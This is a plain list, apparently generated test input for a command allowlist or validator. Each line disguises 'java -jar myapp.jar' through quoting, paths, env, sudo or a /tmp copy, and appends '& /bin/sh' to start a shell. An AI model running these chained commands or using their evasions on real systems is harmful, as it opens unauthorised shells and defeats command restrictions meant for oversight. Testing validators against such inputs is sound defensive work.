"java"  -jar myapp.jar & /bin/sh
"java" -jar myapp.jar & /bin/sh
"java"-jar myapp.jar & /bin/sh
'java'  -jar myapp.jar & /bin/sh
'java' -jar myapp.jar & /bin/sh
'java'-jar myapp.jar & /bin/sh
/bin/"java"  -jar myapp.jar & /bin/sh
/bin/"java" -jar myapp.jar & /bin/sh
/bin/"java"-jar myapp.jar & /bin/sh
/bin/'java'  -jar myapp.jar & /bin/sh
/bin/'java' -jar myapp.jar & /bin/sh
/bin/'java'-jar myapp.jar & /bin/sh
/bin/j""ava  -jar myapp.jar & /bin/sh
/bin/j""ava -jar myapp.jar & /bin/sh
/bin/j""ava-jar myapp.jar & /bin/sh
/bin/j''ava  -jar myapp.jar & /bin/sh
/bin/j''ava -jar myapp.jar & /bin/sh
/bin/j''ava-jar myapp.jar & /bin/sh
/bin/java  -jar myapp.jar & /bin/sh
/bin/java -jar myapp.jar & /bin/sh
/bin/java-jar myapp.jar & /bin/sh
/usr/bin/"java"  -jar myapp.jar & /bin/sh
/usr/bin/"java" -jar myapp.jar & /bin/sh
/usr/bin/"java"-jar myapp.jar & /bin/sh
/usr/bin/'java'  -jar myapp.jar & /bin/sh
/usr/bin/'java' -jar myapp.jar & /bin/sh
/usr/bin/'java'-jar myapp.jar & /bin/sh
/usr/bin/j""ava  -jar myapp.jar & /bin/sh
/usr/bin/j""ava -jar myapp.jar & /bin/sh
/usr/bin/j""ava-jar myapp.jar & /bin/sh
/usr/bin/j''ava  -jar myapp.jar & /bin/sh
/usr/bin/j''ava -jar myapp.jar & /bin/sh
/usr/bin/j''ava-jar myapp.jar & /bin/sh
/usr/bin/java  -jar myapp.jar & /bin/sh
/usr/bin/java -jar myapp.jar & /bin/sh
/usr/bin/java-jar myapp.jar & /bin/sh
command "java"  -jar myapp.jar & /bin/sh
command "java" -jar myapp.jar & /bin/sh
command "java"-jar myapp.jar & /bin/sh
command 'java'  -jar myapp.jar & /bin/sh
command 'java' -jar myapp.jar & /bin/sh
command 'java'-jar myapp.jar & /bin/sh
command j""ava  -jar myapp.jar & /bin/sh
command j""ava -jar myapp.jar & /bin/sh
command j""ava-jar myapp.jar & /bin/sh
command j''ava  -jar myapp.jar & /bin/sh
command j''ava -jar myapp.jar & /bin/sh
command j''ava-jar myapp.jar & /bin/sh
command java  -jar myapp.jar & /bin/sh
command java -jar myapp.jar & /bin/sh
command java-jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_0 && /tmp/tmp_bin_0 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_28 && /tmp/tmp_bin_28 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_29 && /tmp/tmp_bin_29 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_3 && /tmp/tmp_bin_3 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_30 && /tmp/tmp_bin_30 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_31 && /tmp/tmp_bin_31 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_32 && /tmp/tmp_bin_32 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_33 && /tmp/tmp_bin_33 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_34 && /tmp/tmp_bin_34 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_35 && /tmp/tmp_bin_35 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_36 && /tmp/tmp_bin_36 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_37 && /tmp/tmp_bin_37 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_38 && /tmp/tmp_bin_38 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_39 && /tmp/tmp_bin_39 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_4 && /tmp/tmp_bin_4 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_40 && /tmp/tmp_bin_40 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_41 && /tmp/tmp_bin_41 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_42 && /tmp/tmp_bin_42 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_43 && /tmp/tmp_bin_43 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_44 && /tmp/tmp_bin_44 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_45 && /tmp/tmp_bin_45 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_46 && /tmp/tmp_bin_46 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_47 && /tmp/tmp_bin_47 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_48 && /tmp/tmp_bin_48 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_49 && /tmp/tmp_bin_49 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_5 && /tmp/tmp_bin_5 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_50 && /tmp/tmp_bin_50 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_51 && /tmp/tmp_bin_51 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_52 && /tmp/tmp_bin_52 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_53 && /tmp/tmp_bin_53 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_54 && /tmp/tmp_bin_54 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_55 && /tmp/tmp_bin_55 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_56 && /tmp/tmp_bin_56 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_57 && /tmp/tmp_bin_57 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_58 && /tmp/tmp_bin_58 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_59 && /tmp/tmp_bin_59 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_6 && /tmp/tmp_bin_6 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_60 && /tmp/tmp_bin_60 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_61 && /tmp/tmp_bin_61 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_62 && /tmp/tmp_bin_62 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_63 && /tmp/tmp_bin_63 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_64 && /tmp/tmp_bin_64 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_65 && /tmp/tmp_bin_65 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_66 && /tmp/tmp_bin_66 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_67 && /tmp/tmp_bin_67 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_68 && /tmp/tmp_bin_68 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_69 && /tmp/tmp_bin_69 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_7 && /tmp/tmp_bin_7 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_70 && /tmp/tmp_bin_70 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_71 && /tmp/tmp_bin_71 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_72 && /tmp/tmp_bin_72 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_73 && /tmp/tmp_bin_73 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_74 && /tmp/tmp_bin_74 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_75 && /tmp/tmp_bin_75 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_76 && /tmp/tmp_bin_76 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_77 && /tmp/tmp_bin_77 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_78 && /tmp/tmp_bin_78 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_79 && /tmp/tmp_bin_79 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_8 && /tmp/tmp_bin_8 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_80 && /tmp/tmp_bin_80 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_81 && /tmp/tmp_bin_81 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_82 && /tmp/tmp_bin_82 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_83 && /tmp/tmp_bin_83 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_84 && /tmp/tmp_bin_84 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_85 && /tmp/tmp_bin_85 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_86 && /tmp/tmp_bin_86 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_87 && /tmp/tmp_bin_87 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_88 && /tmp/tmp_bin_88 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_89 && /tmp/tmp_bin_89 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_9 && /tmp/tmp_bin_9 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_90 && /tmp/tmp_bin_90 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_91 && /tmp/tmp_bin_91 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_92 && /tmp/tmp_bin_92 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_93 && /tmp/tmp_bin_93 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_94 && /tmp/tmp_bin_94 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_95 && /tmp/tmp_bin_95 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_96 && /tmp/tmp_bin_96 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_97 && /tmp/tmp_bin_97 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_98 && /tmp/tmp_bin_98 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_99 && /tmp/tmp_bin_99 -jar myapp.jar & /bin/sh
env "java"  -jar myapp.jar & /bin/sh
env "java" -jar myapp.jar & /bin/sh
env "java"-jar myapp.jar & /bin/sh
env 'java'  -jar myapp.jar & /bin/sh
env 'java' -jar myapp.jar & /bin/sh
env 'java'-jar myapp.jar & /bin/sh
env -i "java"  -jar myapp.jar & /bin/sh
env -i "java" -jar myapp.jar & /bin/sh
env -i "java"-jar myapp.jar & /bin/sh
env -i 'java'  -jar myapp.jar & /bin/sh
env -i 'java' -jar myapp.jar & /bin/sh
env -i 'java'-jar myapp.jar & /bin/sh
env -i j""ava  -jar myapp.jar & /bin/sh
env -i j""ava -jar myapp.jar & /bin/sh
env -i j""ava-jar myapp.jar & /bin/sh
env -i j''ava  -jar myapp.jar & /bin/sh
env -i j''ava -jar myapp.jar & /bin/sh
env -i j''ava-jar myapp.jar & /bin/sh
env -i java  -jar myapp.jar & /bin/sh
env -i java -jar myapp.jar & /bin/sh
env -i java-jar myapp.jar & /bin/sh
env j""ava  -jar myapp.jar & /bin/sh
env j""ava -jar myapp.jar & /bin/sh
env j""ava-jar myapp.jar & /bin/sh
env j''ava  -jar myapp.jar & /bin/sh
env j''ava -jar myapp.jar & /bin/sh
env j''ava-jar myapp.jar & /bin/sh
env java  -jar myapp.jar & /bin/sh
env java -jar myapp.jar & /bin/sh
env java-jar myapp.jar & /bin/sh
j""ava  -jar myapp.jar & /bin/sh
j""ava -jar myapp.jar & /bin/sh
j""ava-jar myapp.jar & /bin/sh
j''ava  -jar myapp.jar & /bin/sh
j''ava -jar myapp.jar & /bin/sh
j''ava-jar myapp.jar & /bin/sh
java  -jar myapp.jar & /bin/sh
java -jar myapp.jar & /bin/sh
java-jar myapp.jar & /bin/sh
sudo "java"  -jar myapp.jar & /bin/sh
sudo "java" -jar myapp.jar & /bin/sh
sudo "java"-jar myapp.jar & /bin/sh
sudo 'java'  -jar myapp.jar & /bin/sh
sudo 'java' -jar myapp.jar & /bin/sh
sudo 'java'-jar myapp.jar & /bin/sh
sudo j""ava  -jar myapp.jar & /bin/sh
sudo j""ava -jar myapp.jar & /bin/sh
sudo j""ava-jar myapp.jar & /bin/sh
sudo j''ava  -jar myapp.jar & /bin/sh
sudo j''ava -jar myapp.jar & /bin/sh
sudo j''ava-jar myapp.jar & /bin/sh
sudo java  -jar myapp.jar & /bin/sh
sudo java -jar myapp.jar & /bin/sh
sudo java-jar myapp.jar & /bin/sh
